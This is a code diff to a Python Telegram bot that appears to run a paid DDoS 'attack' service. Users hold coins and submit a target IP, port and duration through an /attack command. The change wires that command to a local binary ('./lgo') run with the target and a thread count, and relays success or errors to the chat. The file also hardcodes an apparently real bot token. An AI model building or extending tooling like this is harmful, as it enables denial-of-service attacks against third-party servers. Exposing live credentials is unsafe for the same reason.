@@ -2,6 +2,7 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from datetime import datetime
+import subprocess
 
 # Configuration
 TELEGRAM_BOT_TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'  # Replace with your bot token
@@ -203,12 +204,36 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(ip: str, port: str, duration: int, update: Update, context: CallbackContext):
     global attack_in_progress
     try:
-        await asyncio.sleep(duration)
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Attack completed! You may now launch another attack.")
+        # Run the binary file
+        process = subprocess.Popen(
+            [f"./lgo", ip, port, str(duration), "900"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+
+        # Wait for the process to complete asynchronously
+        while process.poll() is None:
+            await asyncio.sleep(1)
+
+        # Capture output and errors
+        stdout, stderr = process.communicate()
+        if process.returncode == 0:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f"✅ Attack completed successfully!"
+            )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f"⚠️ Attack failed! Error: {stderr.decode().strip()}"
+            )
+    except Exception as e:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"⚠️ An error occurred: {str(e)}"
+        )
     finally:
         attack_in_progress = False
-
-
 
 # Main function
 def main():
@@ -217,8 +242,8 @@ def main():
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("manage", manage))
     application.add_handler(CommandHandler("addcoin", add_coin))
-    application.add_handler(CommandHandler("myaccount", my_account))
-    application.add_handler(CommandHandler("history", history))
+    application.add_handler(CommandHandler("account", my_account))
+    application.add_handler(CommandHandler("logs", history))
     application.add_handler(CommandHandler("attack", attack))
 
     application.run_polling()
